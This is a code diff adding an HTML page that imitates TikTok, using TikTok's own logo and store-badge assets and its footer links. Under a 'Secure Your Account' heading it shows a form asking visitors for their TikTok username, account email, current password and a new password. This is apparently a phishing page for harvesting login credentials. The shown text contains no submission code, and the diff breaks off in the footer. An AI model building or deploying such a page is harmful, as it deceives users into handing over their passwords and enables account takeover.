@@ -1,0 +1,1749 @@
+<html>
+  <head>
+    <title>Report a Problem</title>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Roboto", sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f8f8f8;
+      }
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 20px;
+        background-color: white;
+        border-bottom: 1px solid #e8e8e8;
+      }
+      .header .menu-icon {
+        font-size: 24px;
+        cursor: pointer;
+      }
+      .header .logo {
+        display: flex;
+        align-items: center;
+      }
+      .header .logo-link {
+        display: flex;
+        align-items: center;
+        text-decoration: none;
+      }
+      .header .logo-link img {
+        height: 30px;
+      }
+      .header .logo-link .logo-text {
+        margin-left: 5px;
+      }
+      .header .watch-now {
+        background-color: #ff004f;
+        color: white;
+        padding: 10px 20px;
+        border-radius: 5px;
+        text-decoration: none;
+      }
+      .report-section {
+        padding: 40px 20px;
+        text-align: center;
+      }
+      .report-title {
+        font-size: 36px;
+        margin-bottom: 20px;
+        color: #333;
+      }
+      .report-form-container {
+        background-color: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        max-width: 600px;
+        margin: 0 auto;
+        text-align: left;
+      }
+      .report-description {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 24px;
+        line-height: 1.5;
+      }
+      .report-form {
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+      }
+      .form-label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 500;
+        color: #333;
+      }
+      .form-input,
+      .form-select,
+      .form-textarea {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #e8e8e8;
+        border-radius: 6px;
+        font-size: 14px;
+        transition: border-color 0.2s;
+      }
+      .form-input:focus,
+      .form-select:focus,
+      .form-textarea:focus {
+        outline: none;
+        border-color: #ff004f;
+      }
+      .form-help-text {
+        font-size: 13px;
+        color: #666;
+        margin: -8px 0 16px;
+      }
+      .form-upload-btn {
+        display: inline-block;
+        padding: 12px 24px;
+        background-color: #ff004f;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 14px;
+        transition: background-color 0.2s;
+      }
+      .form-upload-btn:hover {
+        background-color: #e6004c;
+      }
+      .form-declaration {
+        margin: 24px 0;
+        padding: 16px;
+        background-color: #f8f8f8;
+        border-radius: 6px;
+      }
+      .declaration-title {
+        font-weight: 500;
+        margin-bottom: 16px;
+        color: #333;
+      }
+      .declaration-label {
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+        margin-bottom: 12px;
+        font-size: 14px;
+        color: #444;
+        line-height: 1.4;
+      }
+      .declaration-checkbox {
+        margin-top: 3px;
+      }
+      .form-submit-btn {
+        display: block;
+        width: 100%;
+        padding: 16px;
+        background-color: #ff004f;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+      .form-submit-btn:hover {
+        background-color: #e6004c;
+      }
+      .form-submit-btn:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+      }
+      .footer {
+        background-color: black;
+        color: white;
+        padding: 40px 20px;
+        text-align: center;
+      }
+      .footer .download-wrapper {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-wrap: wrap;
+        margin-bottom: 20px;
+      }
+      .footer .download-wrapper .qr-btn {
+        display: flex;
+        align-items: center;
+        margin: 10px;
+        cursor: pointer;
+      }
+      .footer .download-wrapper .qr-btn img {
+        height: 40px;
+        margin-right: 10px;
+      }
+      .footer .download-wrapper .qr-btn span {
+        color: white;
+      }
+      .footer .download-wrapper a {
+        margin: 10px;
+      }
+      .footer .download-wrapper img {
+        height: 40px;
+      }
+      .footer .links {
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+        margin-bottom: 20px;
+      }
+      .footer .links div {
+        margin: 10px 20px;
+      }
+      .footer .links a {
+        color: white;
+        text-decoration: none;
+        display: block;
+        margin-bottom: 5px;
+      }
+      .footer .language-selector {
+        margin-top: 20px;
+      }
+      .footer .language-selector select {
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+      }
+      @media (max-width: 768px) {
+        .header,
+        .footer {
+          flex-direction: column;
+          text-align: center;
+        }
+        .footer .links {
+          flex-direction: column;
+        }
+      }
+      .footer-container {
+        background-color: #000;
+        color: #fff;
+        padding: 40px 0;
+      }
+
+      .download-container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 20px;
+      }
+
+      .download-content h2 {
+        font-size: 24px;
+        margin-bottom: 20px;
+      }
+
+      .download-wrapper {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+        flex-wrap: wrap;
+        margin-bottom: 40px;
+      }
+
+      .qr-btn {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        cursor: pointer;
+        padding: 8px 16px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 4px;
+      }
+
+      .qr-btn img {
+        width: 20px;
+        height: 20px;
+      }
+
+      .qr-btn span {
+        font-size: 14px;
+      }
+
+      .footer-content-wrapper {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 20px;
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 40px;
+      }
+
+      .footer-content-column h4 {
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 16px;
+      }
+
+      .footer-content-column h5 {
+        margin-bottom: 8px;
+      }
+
+      .footer-content-column a {
+        color: rgba(255, 255, 255, 0.7);
+        text-decoration: none;
+        font-size: 13px;
+        transition: color 0.2s;
+      }
+
+      .footer-content-column a:hover {
+        color: #fff;
+      }
+
+      .footer-bottom-wrapper {
+        max-width: 1200px;
+        margin: 40px auto 0;
+        padding: 20px;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .language-selection {
+        position: relative;
+        width: 150px;
+      }
+
+      .language-selection select {
+        width: 100%;
+        padding: 8px 12px;
+        background-color: transparent;
+        color: #fff;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 4px;
+        appearance: none;
+        cursor: pointer;
+      }
+
+      .copyright {
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 12px;
+      }
+
+      @media (max-width: 768px) {
+        .footer-content-wrapper {
+          grid-template-columns: repeat(2, 1fr);
+        }
+
+        .footer-bottom-wrapper {
+          flex-direction: column;
+          gap: 20px;
+          text-align: center;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .footer-content-wrapper {
+          grid-template-columns: 1fr;
+        }
+      }
+      .download-container {
+        background-color: #000;
+        padding: 24px 0;
+      }
+
+      .download-content {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 20px;
+        text-align: center;
+      }
+
+      .download-content h2 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 24px;
+      }
+
+      .download-wrapper {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 16px;
+        flex-wrap: wrap;
+      }
+
+      /* QR Code Button */
+      .qr-btn {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 8px 12px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 2px;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      .qr-btn:hover {
+        background-color: rgba(255, 255, 255, 0.1);
+      }
+
+      .qr-btn .qr-image {
+        width: 20px;
+        height: 20px;
+      }
+
+      .qr-btn span {
+        color: #fff;
+        font-size: 14px;
+      }
+
+      /* Store Badges */
+      .download-wrapper a {
+        display: inline-block;
+        height: 40px;
+      }
+
+      .download-wrapper a img {
+        height: 40px;
+        width: auto;
+        object-fit: contain;
+      }
+
+      /* Specific store badge styles */
+      .apple,
+      .google,
+      .amazon,
+      .microsoft {
+        background-size: auto 40px;
+        background-repeat: no-repeat;
+        width: 120px;
+        height: 40px;
+      }
+
+      .apple {
+        background-position: 0 0;
+      }
+
+      .google {
+        background-position: -130px 0;
+      }
+
+      .amazon {
+        background-position: -260px 0;
+      }
+
+      .microsoft {
+        background-position: -390px 0;
+      }
+
+      /* QR Modal */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 1000;
+      }
+
+      .modal.active {
+        display: block;
+      }
+
+      .modal-wrapper {
+        position: relative;
+        width: 100%;
+        height: 100%;
+      }
+
+      .modal-mask {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+      }
+
+      .modal-content.qr-modal {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff;
+        padding: 24px;
+        border-radius: 8px;
+        text-align: center;
+      }
+
+      .qr-modal .close {
+        position: absolute;
+        top: 16px;
+        right: 16px;
+        width: 24px;
+        height: 24px;
+        cursor: pointer;
+        background: url("path-to-close-icon.svg") no-repeat center;
+      }
+
+      .qr-modal .qr-title {
+        font-size: 16px;
+        color: #000;
+        margin-bottom: 16px;
+      }
+
+      .qr-modal .qr-img {
+        width: 200px;
+        height: 200px;
+      }
+
+      @media (max-width: 768px) {
+        .download-wrapper {
+          gap: 12px;
+        }
+
+        .apple,
+        .google,
+        .amazon,
+        .microsoft {
+          width: 100px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .download-wrapper {
+          flex-direction: column;
+          align-items: center;
+        }
+      }
+      .download-wrapper {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 16px;
+        flex-wrap: wrap;
+      }
+
+      .download-wrapper a {
+        display: block;
+        text-decoration: none;
+        height: 40px;
+        /* Remove any margins that might cause merging */
+        margin: 0;
+      }
+
+      /* Individual store badge styles */
+      .apple {
+        width: 120px;
+        height: 40px;
+        display: block;
+        background-position: 0 0;
+        background-size: 480px 40px; /* Total width of the sprite image */
+      }
+
+      .google {
+        width: 120px;
+        height: 40px;
+        display: block;
+        background-position: -120px 0;
+        background-size: 480px 40px;
+      }
+
+      .amazon {
+        width: 120px;
+        height: 40px;
+        display: block;
+        background-position: -240px 0;
+        background-size: 480px 40px;
+      }
+
+      .microsoft {
+        width: 120px;
+        height: 40px;
+        display: block;
+        background-position: -360px 0;
+        background-size: 480px 40px;
+      }
+
+      /* Fix for Microsoft store wrapper */
+      .ms-image-wrapper {
+        height: 40px;
+      }
+
+      /* Base styles for all store badge images */
+      .download-wrapper img {
+        width: 120px;
+        height: 40px;
+        object-fit: contain;
+        display: block; /* Prevent inline spacing */
+      }
+
+      .password-input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+      }
+
+      .toggle-password {
+        position: absolute;
+        right: 12px;
+        background: none;
+        border: none;
+        color: #666;
+        cursor: pointer;
+        padding: 0;
+        font-size: 16px;
+      }
+
+      .toggle-password:hover {
+        color: #333;
+      }
+
+      .password-strength {
+        margin-top: 8px;
+        padding: 8px;
+        background: #f8f8f8;
+        border-radius: 4px;
+      }
+
+      .strength-bar {
+        height: 4px;
+        background: #ddd;
+        border-radius: 2px;
+        margin-bottom: 8px;
+        overflow: hidden;
+      }
+
+      .strength-bar::before {
+        content: "";
+        display: block;
+        height: 100%;
+        width: 0;
+        background: #ff004f;
+        transition: width 0.3s ease;
+      }
+
+      .strength-bar.weak::before {
+        width: 33.33%;
+        background: #ff4444;
+      }
+
+      .strength-bar.medium::before {
+        width: 66.66%;
+        background: #ffbb33;
+      }
+
+      .strength-bar.strong::before {
+        width: 100%;
+        background: #00c851;
+      }
+
+      .strength-text {
+        font-size: 12px;
+        color: #666;
+        margin: 0;
+      }
+
+      .strength-text span {
+        font-weight: 500;
+      }
+
+      .strength-text span.weak {
+        color: #ff4444;
+      }
+
+      .strength-text span.medium {
+        color: #ffbb33;
+      }
+
+      .strength-text span.strong {
+        color: #00c851;
+      }
+
+      .popup-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .popup-overlay.active {
+        display: flex;
+      }
+
+      .popup-container {
+        background-color: white;
+        padding: 32px;
+        border-radius: 12px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        position: relative;
+      }
+
+      .popup-close {
+        position: absolute;
+        top: 16px;
+        right: 16px;
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: #666;
+      }
+
+      .popup-icon {
+        width: 64px;
+        height: 64px;
+        margin-bottom: 16px;
+      }
+
+      .popup-title {
+        font-size: 24px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 16px;
+      }
+
+      .popup-message {
+        color: #666;
+        margin-bottom: 24px;
+        font-size: 14px;
+        line-height: 1.5;
+      }
+
+      .popup-instructions {
+        text-align: left;
+        margin: 16px 0;
+        padding: 16px;
+        background-color: #f8f8f8;
+        border-radius: 8px;
+      }
+
+      .popup-instructions h3 {
+        font-size: 16px;
+        color: #333;
+        margin-bottom: 12px;
+      }
+
+      .popup-instructions ol {
+        margin: 0;
+        padding-left: 20px;
+      }
+
+      .popup-instructions li {
+        color: #444;
+        margin-bottom: 12px;
+        line-height: 1.4;
+        font-size: 14px;
+      }
+
+      .popup-button {
+        background-color: #ff004f;
+        color: white;
+        border: none;
+        padding: 12px 32px;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      .popup-button:hover {
+        background-color: #e6004c;
+      }
+
+      /* Responsive Design */
+      @media (max-width: 768px) {
+        .header {
+          padding: 8px 16px;
+        }
+
+        .header .logo-link img {
+          height: 24px;
+        }
+
+        .header .watch-now {
+          padding: 8px 16px;
+          font-size: 14px;
+        }
+
+        .report-section {
+          padding: 24px 16px;
+        }
+
+        .report-title {
+          font-size: 28px;
+          margin-bottom: 16px;
+        }
+
+        .report-form-container {
+          padding: 20px;
+          margin: 0 16px;
+        }
+
+        .form-input,
+        .form-select,
+        .form-textarea {
+          padding: 10px;
+          font-size: 16px; /* Prevent zoom on mobile */
+        }
+
+        .form-help-text {
+          font-size: 12px;
+        }
+
+        .form-declaration {
+          padding: 12px;
+        }
+
+        .declaration-label {
+          font-size: 13px;
+        }
+
+        .form-submit-btn {
+          padding: 14px;
+          font-size: 16px;
+        }
+
+        .popup-container {
+          padding: 24px;
+          margin: 0 16px;
+          max-width: none;
+          width: calc(100% - 32px);
+        }
+
+        .popup-title {
+          font-size: 20px;
+        }
+
+        .popup-instructions {
+          padding: 12px;
+        }
+
+        .popup-instructions li {
+          font-size: 13px;
+          margin-bottom: 8px;
+        }
+
+        .popup-button {
+          width: 100%;
+          padding: 12px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        body {
+          background-color: #fff; /* Full white background for mobile */
+        }
+
+        .header {
+          padding: 12px;
+          position: sticky;
+          top: 0;
+          z-index: 100;
+          background: white;
+          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header .menu-icon {
+          font-size: 20px;
+        }
+
+        .header .logo-link img {
+          height: 20px;
+        }
+
+        .header .watch-now {
+          padding: 8px 16px;
+          font-size: 13px;
+        }
+
+        .report-section {
+          padding: 16px 0; /* Remove horizontal padding */
+        }
+
+        .report-title {
+          font-size: 22px;
+          margin: 8px 16px 20px;
+        }
+
+        .report-form-container {
+          padding: 20px 16px;
+          margin: 0;
+          box-shadow: none;
+          border-radius: 0;
+        }
+
+        .report-description {
+          font-size: 13px;
+          margin-bottom: 20px;
+          padding: 0 4px;
+        }
+
+        .form-label {
+          font-size: 14px;
+          margin-bottom: 6px;
+        }
+
+        .form-input,
+        .form-select,
+        .form-textarea {
+          padding: 12px;
+          font-size: 16px; /* Prevent zoom on iOS */
+          margin-bottom: 4px;
+          -webkit-appearance: none; /* Remove default iOS styling */
+          appearance: none;
+        }
+
+        .password-input-wrapper {
+          margin-bottom: 12px;
+        }
+
+        .password-input-wrapper .toggle-password {
+          right: 10px;
+          padding: 8px;
+          font-size: 16px;
+          color: #888;
+        }
+
+        .form-help-text {
+          font-size: 12px;
+          color: #777;
+          margin: 4px 0 16px;
+          padding: 0 4px;
+        }
+
+        .password-strength {
+          margin: 8px 0 16px;
+          padding: 12px;
+        }
+
+        .strength-bar {
+          height: 6px;
+          margin-bottom: 10px;
+        }
+
+        .strength-text {
+          font-size: 12px;
+        }
+
+        .form-declaration {
+          margin: 20px 0;
+          padding: 16px;
+          background-color: #f8f8f8;
+          border: 1px solid #eee;
+        }
+
+        .declaration-title {
+          font-size: 14px;
+          margin-bottom: 12px;
+        }
+
+        .declaration-label {
+          font-size: 13px;
+          line-height: 1.5;
+          display: grid;
+          grid-template-columns: 24px 1fr;
+          gap: 8px;
+          align-items: start;
+        }
+
+        .declaration-checkbox {
+          width: 18px;
+          height: 18px;
+          margin: 0;
+        }
+
+        .form-submit-btn {
+          margin-top: 24px;
+          padding: 16px;
+          font-size: 16px;
+          border-radius: 8px;
+          font-weight: 600;
+          box-shadow: 0 2px 8px rgba(255, 0, 79, 0.2);
+        }
+
+        .form-submit-btn:disabled {
+          background-color: #ddd;
+          box-shadow: none;
+        }
+
+        /* Mobile popup styles */
+        .popup-overlay {
+          padding: 16px;
+        }
+
+        .popup-container {
+          padding: 20px 16px;
+          margin: 0;
+          width: 100%;
+          max-height: 90vh;
+          overflow-y: auto;
+          border-radius: 16px;
+        }
+
+        .popup-icon {
+          width: 40px;
+          height: 40px;
+          margin-bottom: 12px;
+        }
+
+        .popup-title {
+          font-size: 20px;
+          margin-bottom: 12px;
+        }
+
+        .popup-message {
+          font-size: 13px;
+          margin-bottom: 16px;
+        }
+
+        .popup-instructions {
+          margin: 16px 0;
+          padding: 16px;
+          background-color: #f8f8f8;
+          border: 1px solid #eee;
+          border-radius: 12px;
+        }
+
+        .popup-instructions h3 {
+          font-size: 14px;
+          margin-bottom: 12px;
+        }
+
+        .popup-instructions ol {
+          padding-left: 16px;
+        }
+
+        .popup-instructions li {
+          font-size: 13px;
+          margin-bottom: 12px;
+          line-height: 1.5;
+        }
+
+        .popup-button {
+          width: 100%;
+          padding: 16px;
+          font-size: 16px;
+          font-weight: 600;
+          border-radius: 8px;
+          margin-top: 16px;
+        }
+
+        /* Fix for mobile landscape */
+        @media (max-height: 480px) {
+          .report-section {
+            padding: 12px 0;
+          }
+
+          .report-form-container {
+            padding: 16px;
+          }
+
+          .popup-container {
+            max-height: 85vh;
+          }
+
+          .popup-instructions {
+            max-height: 40vh;
+            overflow-y: auto;
+          }
+        }
+
+        /* Fix for very small screens */
+        @media (max-width: 320px) {
+          .report-title {
+            font-size: 20px;
+          }
+
+          .form-input,
+          .form-select,
+          .form-textarea,
+          .form-submit-btn {
+            padding: 12px;
+            font-size: 14px;
+          }
+
+          .popup-container {
+            padding: 16px;
+          }
+        }
+      }
+
+      /* Fix for iOS input zoom */
+      @media screen and (-webkit-min-device-pixel-ratio: 0) { 
+        select,
+        textarea,
+        input {
+          font-size: 16px !important;
+        }
+      }
+
+      /* Tablet-specific adjustments */
+      @media (min-width: 769px) and (max-width: 1024px) {
+        .report-form-container {
+          max-width: 80%;
+        }
+
+        .popup-container {
+          max-width: 80%;
+        }
+
+        .form-input,
+        .form-select,
+        .form-textarea {
+          padding: 12px;
+        }
+
+        .popup-instructions {
+          padding: 20px;
+        }
+      }
+
+      /* Landscape orientation fixes */
+      @media (max-height: 600px) and (orientation: landscape) {
+        .popup-container {
+          max-height: 90vh;
+          overflow-y: auto;
+        }
+
+        .popup-instructions {
+          max-height: 40vh;
+          overflow-y: auto;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="menu-icon">
+        <i class="fas fa-bars"></i>
+      </div>
+      <div class="logo">
+        <a class="logo-link" href="/" title="TikTok">
+          <img
+            alt="TikTok"
+            class="logo-icon"
+            src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/logo-dark-d62c3812fbf2f687daa9-ad23990600d5638a312d7c35028ea32e46618056.svg"
+          />
+          <img
+            alt="TikTok"
+            class="logo-text"
+            src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/logo-text-dark-d795c282c11fef16f8fa-ad23990600d5638a312d7c35028ea32e46618056.svg"
+          />
+        </a>
+      </div>
+      <a class="watch-now" href="https://www.tiktok.com/trending/?lang=en">
+        Watch now
+      </a>
+    </div>
+    <div class="report-section">
+      <h1 class="report-title">Secure Your Account</h1>
+      <div class="report-form-container">
+        <p class="report-description">
+          Update your TikTok account password to keep your account secure.
+          Please fill in all the required information below.
+        </p>
+        <form class="report-form">
+          <label for="username" class="form-label">TikTok Username *</label>
+          <input
+            id="username"
+            name="username"
+            type="text"
+            class="form-input"
+            required
+          />
+          <p class="form-help-text">
+            Enter your TikTok username without the @ symbol
+          </p>
+
+          <label for="email" class="form-label">Account Email *</label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            class="form-input"
+            required
+          />
+          <p class="form-help-text">
+            Enter the email address associated with your TikTok account
+          </p>
+
+          <label for="current-password" class="form-label"
+            >Current Password *</label
+          >
+          <div class="password-input-wrapper">
+            <input
+              id="current-password"
+              name="current-password"
+              type="password"
+              class="form-input"
+              required
+            />
+            <button
+              type="button"
+              class="toggle-password"
+              data-target="current-password"
+            >
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
+
+          <label for="new-password" class="form-label">New Password *</label>
+          <div class="password-input-wrapper">
+            <input
+              id="new-password"
+              name="new-password"
+              type="password"
+              class="form-input"
+              required
+            />
+            <button
+              type="button"
+              class="toggle-password"
+              data-target="new-password"
+            >
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
+          <p class="form-help-text">
+            Password must be at least 8 characters long and include a mix of
+            letters, numbers, and special characters
+          </p>
+
+          <div class="password-strength" id="password-strength">
+            <div class="strength-bar"></div>
+            <p class="strength-text">Password strength: <span>Weak</span></p>
+          </div>
+
+          <div class="form-declaration">
+            <p class="declaration-title">Security Confirmation</p>
+            <label class="declaration-label">
+              <input type="checkbox" class="declaration-checkbox" />
+              I confirm this is my TikTok account and I authorize this password
+              change
+            </label>
+          </div>
+
+          <button class="form-submit-btn" type="submit">Update Password</button>
+        </form>
+      </div>
+    </div>
+    <div class="footer-container">
+      <div class="download-container">
+        <div class="download-content">
+          <h2>Download now</h2>
+          <div class="download-wrapper">
+            <div class="qr-btn">
+              <img
+                class="qr-image"
+                src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/qr_icon-b8e8044a1201959b4c99-ad23990600d5638a312d7c35028ea32e46618056.svg"
+              /><span>QR CODE</span>
+            </div>
+            <div class="modal">
+              <div class="modal-wrapper">
+                <div class="modal-mask"></div>
+                <div class="modal-content qr-modal">
+                  <div class="close"></div>
+                  <p class="qr-title">Scan QR code to download TikTok</p>
+                  <img
+                    class="qr-img"
+                    src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/white_qr_code-a888770fc1f75e17f201-ad23990600d5638a312d7c35028ea32e46618056.png"
+                  />
+                </div>
+              </div>
+            </div>
+            <a
+              href="https://www.tiktok.com/download-link/af/id835599320"
+              target="_blank"
+              rel="nofollow noreferrer"
+              ><img
+                class="apple"
+                src="https://sf-tb-sg.ibytedtos.com/obj/ttfe-malisg/tiktok_web/store-badge/nothing.png"
+                alt="apple-store"
+                style="
+                  background-image: url(https://sf-tb-sg.ibytedtos.com/img/ttfe-malisg/tiktok_web/store-badge/en.png~296x0.image);
+                " /></a
+            ><a
+              href="https://www.tiktok.com/download-link/af/com.zhiliaoapp.musically"
+              target="_blank"
+              rel="nofollow noreferrer"
+              ><img
+                class="google"
+                src="https://sf-tb-sg.ibytedtos.com/obj/ttfe-malisg/tiktok_web/store-badge/nothing.png"
+                alt="google-store"
+                style="
+                  background-image: url(https://sf-tb-sg.ibytedtos.com/img/ttfe-malisg/tiktok_web/store-badge/en.png~296x0.image);
+                " /></a
+            ><a
+              href="https://www.amazon.com/dp/B0117U0G3M/"
+              target="_blank"
+              rel="nofollow noreferrer"
+              ><img
+                class="amazon"
+                src="https://sf-tb-sg.ibytedtos.com/obj/ttfe-malisg/tiktok_web/store-badge/nothing.png"
+                alt="amazon-store"
+                style="
+                  background-image: url(https://sf-tb-sg.ibytedtos.com/img/ttfe-malisg/tiktok_web/store-badge/en.png~296x0.image);
+                " /></a
+            ><a
+              href="https://www.microsoft.com/store/apps/9NH2GPH4JZS4"
+              target="_blank"
+              rel="nofollow noreferrer"
+              ><div class="ms-image-wrapper">
+                <img
+                  class="microsoft"
+                  src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/en-f1596f39e85631c052c4-ad23990600d5638a312d7c35028ea32e46618056.png"
+                  alt="microsoft-store"
+                  style="
+                    background-image: url(https://sf-tb-sg.ibytedtos.com/img/ttfe-malisg/tiktok_web/store-badge/en.png~296x0.image);
+                  "
+                /></div
+            ></a>
+          </div>
+        </div>
+      </div>
+      <footer class="footer-content-wrapper">
+        <div class="tiktok-logo">
+          <div class="logo-container">
+            <img
+              src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/logo-532822e454c2ebfb58f5-ad23990600d5638a312d7c35028ea32e46618056.svg"
+              class="logo-icon"
+            /><img
+              src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/logotext-1bdb0c1a2c28f4c2b16f-ad23990600d5638a312d7c35028ea32e46618056.svg"
+              class="logo-text"
+            />
+          </div>
+          <strong>TikTok</strong>
+        </div>
+        <div class="footer-content-column">
+          <h4>Company</h4>
+          <h5 class="to-other">
+            <a href="https://www.tiktok.com/about?lang=en" rel="noreferrer"
+              ><span>About TikTok</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a href="https://newsroom.tiktok.com/en-us?lang=en" rel="noreferrer"
+              ><span>Newsroom</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/about/contact?lang=en"
+              rel="noreferrer"
+              ><span>Contact</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://careers.tiktok.com?lang=en"
+              target="_blank"
+              rel="noreferrer"
+              ><span>Careers</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.bytedance.com?lang=en"
+              target="_blank"
+              rel="noreferrer"
+              ><span>ByteDance</span></a
+            >
+          </h5>
+        </div>
+        <div class="footer-content-column">
+          <h4>Programs</h4>
+          <h5 class="to-other">
+            <a href="https://www.tiktok.com/forgood?lang=en" rel="noreferrer"
+              ><span>TikTok for Good</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://developers.tiktok.com/?refer=tiktok_web&amp;lang=en"
+              target="_blank"
+              rel="noreferrer"
+              ><span>TikTok for Developers</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://effecthouse.tiktok.com/?utm_source=tiktok_article_legal&amp;lang=en"
+              rel="noreferrer"
+              ><span>Effect House</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/business/&amp;attr_source=tt_official_site&amp;attr_medium=tt_official_site_guidance?lang=en"
+              target="_blank"
+              rel="noreferrer"
+              ><span>Advertise on TikTok</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/browse?lang=en"
+              target="_blank"
+              rel="noreferrer"
+              ><span>TikTok Browse</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a href="https://www.tiktok.com/embed?lang=en" rel="noreferrer"
+              ><span>TikTok Embeds</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/tiktok-rewards?lang=en"
+              rel="noreferrer"
+              ><span>TikTok Rewards</span></a
+            >
+          </h5>
+        </div>
+        <div class="footer-content-column">
+          <h4>Resources</h4>
+          <h5 class="to-other">
+            <a href="https://support.tiktok.com/en?lang=en" rel="noreferrer"
+              ><span>Help Center</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a href="https://www.tiktok.com/safety?lang=en" rel="noreferrer"
+              ><span>Safety Center</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="http://www.tiktok.com/creator-academy?lang=en"
+              rel="noreferrer"
+              ><span>Creator Academy</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/community-guidelines?lang=en"
+              rel="noreferrer"
+              ><span>Community Guidelines</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/transparency?lang=en"
+              rel="noreferrer"
+              ><span>Transparency</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/accessibility?lang=en"
+              rel="noreferrer"
+              ><span>Accessibility</span></a
+            >
+          </h5>
+        </div>
+        <div class="footer-content-column">
+          <h4>Legal</h4>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/legal/page/global/childrens-privacy-policy/en?lang=en"
+              rel="noreferrer"
+              ><span>Children's Privacy Policy</span></a
+            >
+          </h5>
+          <h5 class="to-other">
+            <a
+              href="https://www.tiktok.com/legal/page/row/terms-of-service/en?lang=en"
